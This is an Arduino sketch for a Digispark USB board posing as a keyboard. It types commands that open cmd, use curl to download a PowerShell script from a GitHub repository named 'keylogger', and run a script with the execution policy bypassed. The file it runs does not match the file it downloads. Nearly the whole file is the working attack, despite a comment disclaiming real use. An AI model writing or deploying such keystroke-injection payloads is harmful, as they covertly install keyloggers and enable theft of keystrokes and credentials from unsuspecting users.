#include "DigiKeyboard.h"
int Led_int=1;
void setup() {
  pinMode(Led_int, OUTPUT);

}

void loop() {
  int i;
  for(i=0;i<2;i++){ /*this is for showing that it will now run not to be used for actual purpose*/
    digitalWrite(Led_int,HIGH);
    delay(1000);
    digitalWrite(Led_int,LOW);
    delay(500);}


  digitalWrite(Led_int,HIGH);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(200);
  DigiKeyboard.print("cmd");
  delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(750);
  DigiKeyboard.print("curl -O https://raw.githubusercontent.com/Su-nlight/keylogger/main/windows/inject_script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File inject_to_windows.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(6000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(Led_int,LOW);
  while(true);
}
